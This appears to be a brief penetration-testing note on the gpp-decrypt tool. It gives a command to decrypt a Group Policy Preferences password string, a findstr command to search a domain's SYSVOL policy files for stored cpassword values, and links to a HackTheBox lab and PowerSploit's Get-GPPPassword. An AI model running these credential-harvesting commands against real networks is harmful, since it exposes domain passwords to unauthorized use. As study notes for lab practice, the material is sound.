---
tags:
  - tool
---
# gpp-decrypt

Decrypt GPP encrypted strings

## Capabilities

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

usually stored in SYSVOL share all authenticated users have READ access


find string
```
findstr /S /I /cpassword \\something.local\sysvol\something.local\policies\*.xml
```


examples of this on the box  [Active][https://app.hackthebox.com/machines/148] and the following tool [GetGPPassword][https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1] can also be used